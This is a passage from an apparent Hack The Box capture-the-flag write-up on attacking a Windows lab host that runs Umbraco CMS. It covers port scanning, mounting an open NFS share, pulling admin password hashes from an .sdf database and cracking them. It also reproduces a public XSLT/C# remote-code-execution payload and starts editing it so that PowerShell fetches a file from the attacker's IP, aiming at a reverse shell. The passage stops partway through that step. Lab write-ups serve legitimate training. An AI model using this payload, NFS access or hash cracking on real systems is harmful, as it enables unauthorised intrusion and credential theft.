</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65519</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>21/tcp    open  ftp           Microsoft ftpd
</span></span><span style="display:flex;"><span>|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ftp-syst:
</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Home - Acme Widgets
</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind?
</span></span><span style="display:flex;"><span>|_rpcinfo: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>2049/tcp  open  mountd        1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49678/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49679/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49680/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>TCP/IP fingerprint:
</span></span><span style="display:flex;"><span>OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.94SVN%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>9/8%OT<span style="color:#f92672">=</span>21%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>44443%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>I%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>66DD5
</span></span><span style="display:flex;"><span>OS:BE2%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>106%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10C%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S%T
</span></span><span style="display:flex;"><span>OS:S<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>106%GCD<span style="color:#f92672">=</span>2%ISR<span style="color:#f92672">=</span>10C%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S%TS<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M53CNW8NNS%
</span></span><span style="display:flex;"><span>OS:O2<span style="color:#f92672">=</span>M53CNW8NNS%O3<span style="color:#f92672">=</span>M53CNW8%O4<span style="color:#f92672">=</span>M53CNW8NNS%O5<span style="color:#f92672">=</span>M53CNW8NNS%O6<span style="color:#f92672">=</span>M53CNNS<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>F
</span></span><span style="display:flex;"><span>OS:FFF%W2<span style="color:#f92672">=</span>FFFF%W3<span style="color:#f92672">=</span>FFFF%W4<span style="color:#f92672">=</span>FFFF%W5<span style="color:#f92672">=</span>FFFF%W6<span style="color:#f92672">=</span>FF70<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>FFFF%O<span style="color:#f92672">=</span>M
</span></span><span style="display:flex;"><span>OS:53CNW8NNS%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>OS:0%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%
</span></span><span style="display:flex;"><span>OS:Q<span style="color:#f92672">=)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%
</span></span><span style="display:flex;"><span>OS:A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%
</span></span><span style="display:flex;"><span>OS:DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIP
</span></span><span style="display:flex;"><span>OS:L<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%CD<span style="color:#f92672">=</span>Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>|_clock-skew: 59m59s
</span></span><span style="display:flex;"><span>| smb2-time:
</span></span><span style="display:flex;"><span>|   date: 2024-09-08T09:09:49
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span>|   3:1:1:
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 143.44 seconds</span></span></code></pre></div>
    
</div>
<h3 id="ftp-21-enumeration">FTP 21 Enumeration:</h3>
<ul>
<li>I connect but is shows there is no information in the share.
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-090707_.png">
</figure>
</li>
</ul>
</li>
<li>Just to ensure I am not being crazy I try to download all files using <code>wget</code>.
<ul>
<li><code>wget -m --no-passive ftp://anonymous:anonymous@$box</code></li>
<li><figure><img src="/ox-hugo/2024-09-08-092011_.png">
</figure>
</li>
<li>However, there is nothing in the FTP share so we can move on.</li>
</ul>
</li>
</ul>
<h3 id="smb-445-enumeration">SMB 445 Enumeration:</h3>
<ul>
<li>I check for null session &amp; guest account but these are both disabled for SMB:
<ul>
<li>
<p><code>netexec smb $box -u '' -p '' --shares</code></p>
</li>
<li>
<p><code>netexec smb $box -u 'guest' -p '' --shares</code></p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-091050_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Discoveries</strong>:</p>
<ul>
<li>We can see the hose is Running Windows 10 or Server 2019 &amp; that SMB Signing is disabled (This would be great if we had more than one machine in the env as we could do a relay attack)</li>
</ul>
</li>
<li>
<p>There doesn&rsquo;t seem to be much else here, so let&rsquo;s move on.</p>
</li>
</ul>
</li>
</ul>
<h3 id="nfs-2049-enumeration">NFS 2049 Enumeration:</h3>
<p>As NFS by default is very insecure (unless using kerberos you can only limit the source IP connections) we can mount the share locally.</p>
<ul>
<li>
<p><strong>Create target folder to mount it to</strong>:</p>
<ul>
<li><code>mkdir target-NFS</code></li>
</ul>
</li>
<li>
<p><strong>Mount the share</strong>:</p>
<ul>
<li>
<p><code>sudo mount -t nfs $box:/ ./target-NFS -o nolock</code></p>
</li>
<li>
<figure><img src="/ox-hugo/2024-09-08-093039_.png">
</figure>

</li>
</ul>
</li>
<li>
<p><strong>We find it has the</strong> <code>site_backups</code> <strong>folder</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-093106_.png">
</figure>
</li>
<li>This could mean it has hard coded creds in it or other interesting things.</li>
</ul>
</li>
</ul>
<h4 id="log-files">Log Files:</h4>
<ul>
<li>
<p><strong>Looking through the NFS share I find a</strong> <code>Logs</code> <strong>folder</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-100244_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Grepping through the files we see the following entry</strong>:</p>
<ul>
<li>
<p><strong>Pasword information</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-100328_.png">
</figure>
</li>
<li>So from this we can see that the site is running <code>Umbraco</code> &amp; that the password is 10 chars long as a minimum:</li>
</ul>
</li>
<li>
<p><strong>I then see these login attempts</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-100504_.png">
</figure>
</li>
<li>We can see the valid admin user is <code>admin@htb.local</code> &amp; not <code>admin</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="enumerating-the-version-number">Enumerating The Version Number:</h4>
<ul>
<li>
<p>After some hunting I found this page that tells us how to enumerate the version of Umbraco.</p>
<ul>
<li><a href="https://our.umbraco.com/forum/getting-started/installing-umbraco/15825-Umbraco-version-and-a-test-site">https://our.umbraco.com/forum/getting-started/installing-umbraco/15825-Umbraco-version-and-a-test-site</a></li>
</ul>
</li>
<li>
<figure><img src="/ox-hugo/2024-09-08-104749_.png">
</figure>

</li>
<li>
<p>I grep the <code>Web.Config</code> and find the version is <code>7.12.4</code></p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-104820_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I run a quick search on</strong> <code>exploit-db</code> <strong>and find the following authenticated exploit</strong>:</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/49488">https://www.exploit-db.com/exploits/49488</a></li>
<li>It is an authenticated exploit so we can safely assume that there will be some credentials somewhere, either in this share or on the site.
<ul>
<li>I find the Admin Panel Login Page: <a href="http://10.129.200.122/umbraco/#/login">http://10.129.200.122/umbraco/#/login</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="the-hunt-for-credentials">The hunt for credentials:</h3>
<ul>
<li><strong>I find this file</strong> <code>Umbraco.sdf</code> <strong>in the</strong> <code>App_Data</code> <strong>directory</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-115829_.png">
</figure>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>I had never heard of this file but after some searching found the following:</p>
<blockquote>
<p>What is an SDF file?
An SDF file contains a compact relational database saved in the SQL Server Compact (SQL CE) format, which is developed by Microsoft. It is designed for applications that run on mobile devices and desktops and contains the complete database contents, which may be up to 4GB in size.</p>
</blockquote>
</li>
</ul>
<h5 id="extracting-data-from-the-dot-sdf-file">Extracting Data from the <code>.sdf</code> file:</h5>
<ul>
<li>Initially after-being unable to view the file locally I spun up a windows VM and tried to extract the data with this tool but it would not work for me (this was a rabbit hole that I spent alot of time on.):
<ul>
<li><a href="https://github.com/christianhelle/sqlcequery">https://github.com/christianhelle/sqlcequery</a></li>
</ul>
</li>
</ul>
<h5 id="good-old-strings">Good Old Strings:</h5>
<ul>
<li><strong>There be hashes in them thar</strong> <code>.sdf</code> <strong>files</strong>:
<ul>
<li>Eventually I just resorted to running &ldquo;Strings&rdquo; on the file and hoping for the best &amp; guess what, some lovely hashes were at the top!
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-121704_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="cracking-the-hashes">Cracking the hashes:</h3>
<ul>
<li>
<p><strong>I run the admin hash through hashcat &amp; rockyou</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-122201_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>It&rsquo;s SHA1 so cracked easily</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-122130_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="http-enumeration">HTTP Enumeration:</h3>
<ul>
<li>Usually I would have done more here, but we have already gotten so far, that I did not have to do basic things like dir-busting just yet (we may come back here)</li>
</ul>
<h2 id="2-dot-foothold">2. Foothold:</h2>
<ul>
<li>I navigate to the Login Page &amp; the creds work: <a href="http://10.129.200.122/umbraco/#/login">http://10.129.200.122/umbraco/#/login</a></li>
<li><strong>With our creds we now have access to the admin console</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-122514_.png">
</figure>
</li>
<li>There doesn&rsquo;t seem to be much here in the way of information or a clear path to privesc.</li>
</ul>
</li>
</ul>
<h3 id="getting-rce-with-public-exploits">Getting RCE with public exploits:</h3>
<h4 id="exploit-1">Exploit 1:</h4>
<ul>
<li>
<p>I copy the public exploit here to my machine:</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/49488">https://www.exploit-db.com/exploits/49488</a></li>
</ul>
</li>
<li>
<p><strong>I run it &amp; boom RCE</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-163347_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>After some playing I was only ever able to get single commands to run, I could not use things like <code>Invoke-WebRequest</code> etc to get a shell. I also tried to upload a <code>.bat</code> POC with a simple call back to a running webserver I had, but I couldn&rsquo;t even get that uploaded.</p>
</li>
<li>
<p>After looking at the source code further for the above exploit, I could see the following line:</p>
<ul>
<li><code># Based on: https://www.exploit-db.com/exploits/46153</code> so I had a look a that exploit:</li>
</ul>
</li>
</ul>
<h4 id="exploit-2">Exploit 2:</h4>
<ul>
<li>
<p>The payload of this scrip has an <code>XSLT</code> (Extensible Stylesheet Language Transformations) script with an embedded <code>C#</code> script within it that executes <code>calc.exe</code> (the calculator).</p>
<ul>
<li>If you&rsquo;re unfamiliar launching <code>calc.exe</code> is a standard way to prove RCE on a machine.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>payload = &#39;<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span><span style="color:#f92672">&lt;xsl:stylesheet</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.0&#34;</span> <span style="color:#960050;background-color:#1e0010">\</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlns:xsl=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span> <span style="color:#a6e22e">xmlns:msxsl=</span><span style="color:#e6db74">&#34;urn:schemas-microsoft-com:xslt&#34;</span> <span style="color:#960050;background-color:#1e0010">\</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlns:csharp_user=</span><span style="color:#e6db74">&#34;http://csharp.mycompany.com/mynamespace&#34;</span><span style="color:#f92672">&gt;</span>\
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;msxsl:script</span> <span style="color:#a6e22e">language=</span><span style="color:#e6db74">&#34;C#&#34;</span> <span style="color:#a6e22e">implements-prefix=</span><span style="color:#e6db74">&#34;csharp_user&#34;</span><span style="color:#f92672">&gt;</span>public string xml() \
</span></span><span style="display:flex;"><span>{ string cmd = &#34;&#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
</span></span><span style="display:flex;"><span> proc.StartInfo.FileName = &#34;calc.exe&#34;; proc.StartInfo.Arguments = cmd;\
</span></span><span style="display:flex;"><span> proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
</span></span><span style="display:flex;"><span> proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;/msxsl:script&gt;&lt;xsl:template</span> <span style="color:#a6e22e">match=</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;xsl:value-of</span> <span style="color:#a6e22e">select=</span><span style="color:#e6db74">&#34;csharp_user:xml()&#34;</span><span style="color:#f92672">/&gt;</span>\
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;/xsl:template&gt;</span> <span style="color:#f92672">&lt;/xsl:stylesheet&gt;</span> &#39;;</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
<li>
<p>Let&rsquo;s break this down so we both understand it better:</p>
</li>
</ul>
<h4 id="key-components-of-the-payload-code-breakdown">Key Components of the Payload - Code Breakdown:</h4>
<ul>
<li>
<p><strong>XML Declaration</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%27%3c?xml%20version=%221.0%22?%3e%27">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39;<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>&#39;</span></span></code></pre></div>
    
</div>
<ul>
<li>Declares the XML version being used.</li>
</ul>
</li>
<li>
<p><strong>XSLT Stylesheet Declaration</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;xsl:stylesheet</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.0&#34;</span> <span style="color:#a6e22e">xmlns:xsl=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span> <span style="color:#a6e22e">xmlns:msxsl=</span><span style="color:#e6db74">&#34;urn:schemas-microsoft-com:xslt&#34;</span> <span style="color:#a6e22e">xmlns:csharp_user=</span><span style="color:#e6db74">&#34;http://csharp.mycompany.com/mynamespace&#34;</span><span style="color:#f92672">&gt;</span></span></span></code></pre></div>
    
</div>
<ul>
<li>This starts the XSLT stylesheet with necessary namespaces for the transformation.</li>
<li><code>xmlns:msxsl</code>:
<ul>
<li>Allows the usage of Microsoft&rsquo;s XSLT extensions.</li>
</ul>
</li>
<li><code>xmlns:csharp_user</code>:
<ul>
<li>Custom namespace for the embedded <code>C#</code> script.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Embedded C# Script</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;msxsl:script</span> <span style="color:#a6e22e">language=</span><span style="color:#e6db74">&#34;C#&#34;</span> <span style="color:#a6e22e">implements-prefix=</span><span style="color:#e6db74">&#34;csharp_user&#34;</span><span style="color:#f92672">&gt;</span></span></span></code></pre></div>
    
</div>
<ul>
<li>This embeds a <code>C#</code> script inside the XSLT.</li>
<li><code>language=&quot;C#&quot;</code>:
<ul>
<li>Specifies that the script is written in <code>C#</code></li>
</ul>
</li>
<li><code>implements-prefix=&quot;csharp_user&quot;</code>:
<ul>
<li>Links the script to the <code>csharp_user</code> namespace.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>C#</code> <strong>Function to Execute Code</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="public%20string%20xml%28%29%20%7b%0a%20%20%20%20string%20cmd%20=%20%22%22;%0a%20%20%20%20System.Diagnostics.Process%20proc%20=%20new%20System.Diagnostics.Process%28%29;%0a%20%20%20%20proc.StartInfo.FileName%20=%20%22calc.exe%22;%0a%20%20%20%20proc.StartInfo.Arguments%20=%20cmd;%0a%20%20%20%20proc.StartInfo.UseShellExecute%20=%20true;%0a%20%20%20%20proc.StartInfo.RedirectStandardOutput%20=%20true;%0a%20%20%20%20proc.Start%28%29;%0a%20%20%20%20string%20output%20=%20proc.StandardOutput.ReadToEnd%28%29;%0a%20%20%20%20return%20output;%0a%7d">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> xml() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">string</span> cmd = <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    System.Diagnostics.Process proc = <span style="color:#66d9ef">new</span> System.Diagnostics.Process();
</span></span><span style="display:flex;"><span>    proc.StartInfo.FileName = <span style="color:#e6db74">&#34;calc.exe&#34;</span>;
</span></span><span style="display:flex;"><span>    proc.StartInfo.Arguments = cmd;
</span></span><span style="display:flex;"><span>    proc.StartInfo.UseShellExecute = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    proc.StartInfo.RedirectStandardOutput = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    proc.Start();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">string</span> output = proc.StandardOutput.ReadToEnd();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
    
</div>
<ul>
<li>This function named <code>xml()</code> is designed to execute the <code>calc.exe</code> program:
<ul>
<li><strong>Command Line Args</strong>: <code>string cmd = &quot;&quot;;</code> as we can see this allows us pass command line arguments to the program being called, it&rsquo;s empty as we do not need to pass args to <code>calc.exe</code>, but we can use this for later.</li>
<li><strong>Process creation</strong>: Uses the <code>System.Diagnostics.Process</code> class to launch an external process (<code>calc.exe</code>).</li>
<li><strong>Define the process to launch</strong>: <code>proc.StartInfo.FileName = &quot;calc.exe&quot;</code> defines calc.exe as the process to launch.</li>
<li><strong>Shell behavior</strong>: <code>UseShellExecute = false</code> ensures that the process doesn&rsquo;t require a shell to run.</li>
<li><strong>Redirect Output</strong>: <code>RedirectStandardOutput = true</code> captures the output (although <code>calc.exe</code> doesn&rsquo;t produce output in this context).
<strong>Return Output</strong>: <code>return output;</code> The function finally returns the process output.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>XSLT Template</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;xsl:template</span> <span style="color:#a6e22e">match=</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;xsl:value-of</span> <span style="color:#a6e22e">select=</span><span style="color:#e6db74">&#34;csharp_user:xml()&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/xsl:template&gt;</span></span></span></code></pre></div>
    
</div>
<ul>
<li>The XSLT template calls the <code>xml()</code> function from the <code>csharp_user</code> namespace.</li>
<li>The template is applied to the root <code>(/)</code> of the XML document, which means it is executed as soon as the transformation is applied.</li>
</ul>
</li>
<li>
<p><strong>Why does this work?</strong></p>
<ul>
<li>Clearly the program is not sanitizing input nor is it sandboxed which means we can execute arbitrary code.</li>
</ul>
</li>
</ul>
<h4 id="poc-test">POC Test:</h4>
<ul>
<li>
<p>So instead of running calc.exe we need it to trigger a reverse shell via powershell.</p>
<ul>
<li>Let&rsquo;s run a POC to see if we can get this to work.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> xml() {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">string</span> cmd = <span style="color:#e6db74">&#34;wget http://10.10.14.34/POC&#34;</span>;
</span></span><span style="display:flex;"><span>      System.Diagnostics.Process proc = <span style="color:#66d9ef">new</span> System.Diagnostics.Process();
</span></span><span style="display:flex;"><span>      proc.StartInfo.FileName = <span style="color:#e6db74">&#34;powershell.exe&#34;</span>;
</span></span><span style="display:flex;"><span>      proc.StartInfo.Arguments = cmd;
</span></span><span style="display:flex;"><span>      proc.StartInfo.UseShellExecute = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>      proc.StartInfo.RedirectStandardOutput = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>      proc.Start();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">string</span> output = proc.StandardOutput.ReadToEnd();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> output;
